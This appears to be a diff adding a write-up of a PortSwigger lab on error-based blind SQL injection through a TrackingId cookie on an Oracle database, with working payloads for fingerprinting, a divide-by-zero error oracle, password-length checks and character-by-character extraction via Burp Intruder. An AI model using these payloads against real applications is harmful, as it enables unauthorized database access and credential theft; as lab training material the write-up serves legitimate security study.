@@ -1,0 +1,66 @@
+
+# PortSwigger Lab: Blind SQL injection with conditional errors
+
+## 📝 Scenario Description
+This lab contains a Blind SQL injection (SQLi) vulnerability. The application uses a tracking cookie (`TrackingId`) to perform internal analytics, executing a SQL query that processes user input. 
+
+Unlike standard blind injections, this environment does not alter the visible content of the web page based on boolean queries. Instead, it triggers a **HTTP 500 Internal Server Error** if the SQL query causes a database error (Error-Based Blind). The ultimate goal is to extract the password of the `administrator` user.
+
+## 🧭 Step-by-Step Exploitation Methodology
+
+### Step 1: Identification and Environment Fingerprinting
+Injecting a single quote (`'`) into the `TrackingId` cookie causes the server to respond with a **HTTP 500** status code, confirming that we can break the query syntax. Injecting two single quotes (`''`) results in a **HTTP 200 OK** response.
+
+To identify the back-end database engine, concatenation payloads are tested. The environment stabilizes when using the `dual` system table, confirming the use of an **Oracle** database:
+```sql
+TrackingId=xyz'||(SELECT '' FROM dual)||'
+
+Step 2: Verifying the Users Table
+
+We confirm the existence of the users table by forcing a query that limits the returned rows, preventing concatenation breakdown:
+SQL
+
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+Result: HTTP 200 OK (The table exists).
+Step 3: Conditional Error Logic
+
+To extract data, we force a divide-by-zero error (TO_CHAR(1/0)) inside a CASE WHEN statement whenever the evaluated condition is true:
+
+    True Condition (Triggers HTTP 500 Error):
+    SQL
+
+    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+    False Condition (Returns HTTP 200 OK):
+    SQL
+
+    TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+Using this logic, we confirm the existence of our target user:
+SQL
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Result: HTTP 500 (The user exists).
+Step 4: Enumerating Password Length
+
+We iterate through the password length check by modifying the comparison operator until the condition becomes false:
+SQL
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' --> HTTP 500
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' --> HTTP 200 OK
+
+Conclusion: The exact length of the administrator password is 20 characters.
+Step 5: Data Extraction (Burp Intruder)
+
+We leverage the SUBSTR() function paired with a Sniper attack type in Burp Intruder to cycle through each position of the string (from 1 to 20) against an alphanumeric payload list (a-z, 0-9).
+
+Base Payload in Intruder:
+SQL
+
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Filter the Intruder results to isolate requests that return a Status 500.
+
+    Extracted Password: cn8eh8m2s09u3d1lj403
